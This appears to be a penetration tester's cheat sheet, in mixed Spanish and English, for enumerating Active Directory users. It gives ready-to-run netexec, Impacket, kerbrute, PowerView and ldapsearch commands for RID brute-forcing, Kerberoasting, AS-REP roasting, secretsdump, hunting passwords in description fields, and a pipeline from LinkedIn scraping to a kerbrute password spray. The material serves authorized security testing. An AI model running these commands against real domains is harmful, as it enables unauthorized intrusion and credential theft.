---
aliases:
  - User Enum Tooling
  - kerbrute
  - linkedin2username
  - GetADUsers
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - Users Enumeration]]"
  - "[[netexec]]"
  - "[[Impacket Toolkit]]"
---
# AD - Users Enumeration - Tooling

***

## netexec / crackmapexec

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| LDAP user dump | `nxc ldap DC -u u -p p --users` | Full attribute set. |
| SMB SAMR enum | `nxc smb DC -u u -p p --users` | RID brute SAMR. |
| Anonymous attempt | `nxc smb DC -u '' -p '' --users` | Null check. |
| Custom LDAP filter | `nxc ldap DC --query "(filter)" "attrs"` | Targeted. |
| AS-REP roastable | `nxc ldap DC -u u -p p --asreproastable` | Filter. |
| Kerberoast targets | `nxc ldap DC -u u -p p --kerberoasting kerb.txt` | Filter + dump. |
| Admin count | `nxc ldap DC -u u -p p --admin-count` | Tier 0 filter. |
| Password not required | `nxc ldap DC -u u -p p --password-not-required` | Vuln. |
| Active users | `nxc ldap DC -u u -p p --active-users` | Enabled filter. |
| Trusted for delegation | `nxc ldap DC -u u -p p --trusted-for-delegation` | Critical. |
| RID brute | `nxc smb DC -u u -p p --rid-brute 10000` | Range. |
| LAPS-readable | `nxc smb hosts -u u -p p --laps` | Adjacent. |
| gMSA dump | `nxc ldap DC -u u -p p --gmsa` | Adjacent. |
| Output to file | `--users-export users.txt` | Standard. |
| Multi-DC | `nxc smb dcs.txt -u u -p p --users` | Bulk. |
| Spray prep | Combine filters → spray candidates | Workflow. |
^ad-tool-netexec-users

### Comprehensive netexec recon

```bash
DC="dc01.dom.local"
USER="user"
PASS="pass"

# Bulk dumps
nxc ldap $DC -u $USER -p $PASS --users > users_ldap.txt
nxc smb $DC -u $USER -p $PASS --rid-brute 10000 > users_rid.txt
nxc ldap $DC -u $USER -p $PASS --asreproastable > asrep.txt
nxc ldap $DC -u $USER -p $PASS --kerberoasting kerb.txt
nxc ldap $DC -u $USER -p $PASS --admin-count > admins.txt
nxc ldap $DC -u $USER -p $PASS --password-not-required > vuln_users.txt
nxc ldap $DC -u $USER -p $PASS --trusted-for-delegation > delegation.txt

# Anonymous attempts
nxc smb $DC -u '' -p '' --users 2>&1 | tee users_anon.txt
nxc smb $DC -u '' -p '' --rid-brute 10000 2>&1 | tee users_anon_rid.txt
```

___

## Impacket Toolkit

| **Tool** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| GetADUsers | `impacket-GetADUsers -all dom/u:p` | Full list + LastLogon. |
| GetADUsers CSV | `impacket-GetADUsers -all dom/u:p -outputfile users.csv` | Reportable. |
| samrdump | `impacket-samrdump dom/u:p@DC` | SAMR detail. |
| samrdump anonymous | `impacket-samrdump 'dom/'@DC` | Null. |
| lookupsid | `impacket-lookupsid 'dom/u:p'@DC 10000` | RID brute SAMR. |
| lookupsid anonymous | `impacket-lookupsid 'dom/'@DC 10000` | Null. |
| GetUserSPNs | `impacket-GetUserSPNs dom/u:p -request` | Kerberoast. |
| GetNPUsers | `impacket-GetNPUsers dom/ -usersfile u.txt -no-pass` | AS-REP. |
| secretsdump (privileged) | `impacket-secretsdump dom/admin:pass@DC -just-dc-user user` | Single user. |
| psexec / wmiexec / smbexec | Adjacent | Standard. |
| rpcdump | `impacket-rpcdump @DC` | RPC interface enum. |
| getTGT.py | `impacket-getTGT dom/u:p` | Get TGT (auth). |
| ticketer.py | Forge tickets | Adjacent. |
| Kerberos auth (-k -no-pass) | KRB5CCNAME env var | Modern. |
| NTLM hash auth | `-hashes :NT_HASH` | Pass-the-Hash. |
| AES key auth | `-aesKey AES_KEY` | Adjacent. |
^ad-tool-impacket-users

### Impacket workflow

```bash
# Detailed user dump
impacket-GetADUsers -all dom.local/user:pass -dc-ip DC -outputfile users.csv

# RID brute (when null sessions allowed)
impacket-lookupsid 'dom.local/'@DC 10000 | grep "SidTypeUser"

# Authenticated RID brute (more reliable)
impacket-lookupsid 'dom.local/user:pass'@DC 10000 | \
  grep "SidTypeUser" | awk '{print $2}' | cut -d'\' -f2 > users.txt

# AS-REP without auth (validate users + roast)
impacket-GetNPUsers dom.local/ -usersfile users.txt -no-pass

# Kerberoast (auth required)
impacket-GetUserSPNs dom.local/user:pass -request -outputfile kerb.hashes
```

___

## kerbrute

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Userenum | `kerbrute userenum -d dom.local users.txt` | Validate via Kerberos. |
| Userenum specific DC | `kerbrute userenum --dc DC -d dom.local users.txt` | Direct. |
| Output file | `-o results.txt` | Standard. |
| Threads | `-t 100` | Performance. |
| Domain via DNS | Auto-detect SRV | Standard. |
| Downgrade encryption | `--downgrade` | Edge. |
| Password spray | `kerbrute passwordspray -d dom.local users.txt 'pass'` | Adjacent. |
| Brute single user | `kerbrute bruteuser -d dom.local pass.txt user` | Adjacent. |
| BruteForce | `kerbrute bruteforce -d dom.local creds.txt` | Adjacent. |
| Verbose | `-v` | Debug. |
| Quiet | `-q` | Less output. |
| Timeout | `--timeout 5` | Adjusting. |
| Sleep between attempts | Built-in throttling | OPSEC. |
| Pre-auth based | KDC response codes | Detection. |
| No lockout for userenum | KDC doesn't lock | Safe. |
| Detection: bulk Event 4768 | Defender SIEM | Adjacent. |
^ad-tool-kerbrute

### kerbrute usage

```bash
# Install
go install github.com/ropnop/kerbrute@latest

# Or download binary from releases
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64

# Userenum
./kerbrute_linux_amd64 userenum --dc DC -d dom.local usernames.txt -o valid.txt -t 100

# Output:
# [+] VALID USERNAME: jsmith@dom.local
# [+] VALID USERNAME: alice@dom.local
# [+] VALID USERNAME: admin@dom.local
```

___

## PowerView / pywerview

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Get-DomainUser | All users | Standard. |
| Get-DomainUser -SPN | SPN-bound | Kerberoast prep. |
| Get-DomainUser -PreauthNotRequired | AS-REP roastable | Filter. |
| Get-DomainUser -AdminCount | adminCount=1 | Privileged. |
| Get-DomainUser -AllowDelegation | Delegation users | Critical. |
| Get-DomainUser -TrustedToAuth | Constrained delegation | Privileged. |
| Get-DomainUser -Identity user | Single user detail | Standard. |
| Get-DomainUser -LDAPFilter "..." | Custom filter | Flexible. |
| Get-DomainObjectAcl -SamAccountName user | Per-user ACL | ACL audit. |
| Find-LocalAdminAccess | Per-host admin enum | Lateral. |
| Find-DomainShare | Share recon | Adjacent. |
| Find-DomainUserLocation | User session location | Targeting. |
| Find-DomainProcess | Process per user | Targeting. |
| Find-InterestingDomainAcl | Dangerous ACEs | Privesc. |
| pywerview equivalent | Linux | Adjacent. |
| `Get-DomainUserEvent` | Logon events (4624 etc) | Defender adjacent. |
^ad-tool-powerview-users

### PowerView user recon

```powershell
# Comprehensive user detail
Get-DomainUser -SPN | Select Name,SamAccountName,@{n='SPNs';e={$_.serviceprincipalname -join '; '}}

# AS-REP roastable
Get-DomainUser -PreauthNotRequired

# Privileged
Get-DomainUser -AdminCount

# Custom LDAP filter (description leak)
Get-DomainUser -LDAPFilter "(description=*pass*)" |
  Select Name,Description

# Find user location (where logged on)
Find-DomainUserLocation -UserIdentity "target_user"

# Linux pywerview
pywerview get-netuser -u user -p pass -d dom.local --dc-ip DC
pywerview get-netuser -u user -p pass -d dom.local --spn  # Kerberoast prep
```

___

## ldapsearch / Linux LDAP

| **Función** | **Template** | **Notas** |
|:---:|:---:|:---:|
| Standard auth | `ldapsearch -h DC -D 'dom\u' -w pass -b DC=dom,DC=local` | Base. |
| LDAPS | `-H ldaps://DC` | Encrypted. |
| All users | `... "(objectCategory=user)" samAccountName` | Standard. |
| User-only (no computers) | `... "(&(objectCategory=user)(!(objectClass=computer)))"` | Cleaner. |
| Active accounts | `... "(samAccountType=805306368)" + UAC enabled bit` | Refined. |
| AS-REP roastable | `userAccountControl:1.2.840.113556.1.4.803:=4194304` | Bitwise. |
| Unconstrained delegation | `userAccountControl:...=524288` | Bitwise. |
| Constrained delegation | `(msDS-AllowedToDelegateTo=*)` | Direct. |
| GC port | `-p 3268` | Forest queries. |
| Paged results | LDAP_PAGED_RESULT_OID auto | Auto. |
| Output LDIF | Default | Standard. |
| Specific attrs | `attr1 attr2` after filter | Reduce. |
| Sort | `-S attr` | Edge. |
| Binary attrs | `-t` | Edge. |
| windapsearch wrapper | `python windapsearch.py` | Helper. |
| ldap-monitor.py | `monitor changes` | Defender adjacent. |
^ad-tool-ldapsearch-users

### ldapsearch templates

```bash
LDAP="ldapsearch -h DC -D 'dom\\user' -w pass -b DC=dom,DC=local"

# Active normal accounts
$LDAP "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=512))" \
  samAccountName mail

# AS-REP roastable
$LDAP "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  samAccountName

# Kerberoastable
$LDAP "(&(objectCategory=user)(servicePrincipalName=*))" \
  samAccountName servicePrincipalName

# Unconstrained delegation
$LDAP "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  samAccountName

# Description with potential password
$LDAP "(&(objectCategory=user)(|(description=*pass*)(description=*Pass*)(description=*PWD*)))" \
  samAccountName description

# Forest GC query (cross-domain users)
ldapsearch -h DC -p 3268 -D 'dom\user' -w pass -b "" \
  "(objectCategory=user)" samAccountName
```

___

## linkedin2username / Wordlist Generators

| **Tool** | **Use** | **Notas** |
|:---:|:---:|:---:|
| linkedin2username | LinkedIn employee → username candidates | OSINT. |
| username-anarchy | Names → permutations | Standard. |
| cupp | Personal info → password candidates | Adjacent (passwords). |
| crunch | Char-set generator | Edge. |
| Wordlister | Combinator | Adjacent. |
| Mentalist | GUI wordlist builder | Edge. |
| theHarvester | OSINT email/host enum | Email patterns. |
| OSINT-SPY | Comprehensive | Edge. |
| Maltego | Visual OSINT | Edge enterprise. |
| Hunter.io | Email pattern API | Commercial. |
| Snov.io | Email finder | Commercial. |
| `gixxer` SecLists | Domain-specific | Adjacent. |
| `cewl` company website crawl | Wordlist from site | Adjacent. |
| Custom Bash generator | Flexible | DIY. |
| GitHub email leaks (`gitleaks`) | Code repo emails | OSINT. |
| Wayback Machine | Historical staff | OSINT. |
^ad-tool-wordlists-users

### linkedin2username + kerbrute pipeline

```bash
# 1. Generate username candidates from LinkedIn
git clone https://github.com/initstring/linkedin2username
cd linkedin2username
python3 linkedin2username.py -c "Target Company" -u atacante -p pass -n dom.local

# Outputs multiple files:
# - first.last.txt
# - first_last.txt
# - flast.txt
# - firstl.txt

# 2. Combine and dedupe
cat *.txt | sort -u > all_users.txt

# 3. Validate via Kerberos (no auth needed)
kerbrute userenum --dc DC -d dom.local all_users.txt -o valid.txt

# 4. Optional: spray
kerbrute passwordspray --dc DC -d dom.local valid.txt 'Spring2026!'
```

___

## Wordlists & Resources

| **Recurso** | **Path / URL** | **Notas** |
|:---:|:---:|:---:|
| SecLists Usernames | `seclists/Usernames/` | Curated. |
| `Names/names.txt` | First names (50K+) | Foundation. |
| `Names/familynames-usa-top1000.txt` | Surnames | Adjacent. |
| `cirt-default-usernames.txt` | Vendor defaults | Adjacent. |
| `top-usernames-shortlist.txt` | Top 100 common | Quick. |
| HackTricks AD User Enum | `book.hacktricks.xyz` | Reference. |
| The Hacker Recipes - User Enum | `thehacker.recipes/ad/recon` | Comprehensive. |
| Username generators (custom Bash) | DIY | Standard. |
| Mining LinkedIn alternatives | OSINT-SPY, theHarvester | Adjacent. |
| Public breach databases | dehashed.com, HIBP | OSINT. |
| Reverse DNS for hostnames | `dig -x` | Adjacent. |
| Email pattern guess (Hunter.io) | Commercial | Adjacent. |
| MITRE ATT&CK Account Discovery | T1087 | Framework. |
| BloodHound | Visual user analytics | Tool. |
| Microsoft Defender for Identity | Anomaly detection | Defender. |
| `awesome-active-directory` | Curated | Foundation. |
^ad-tool-resources-users

***
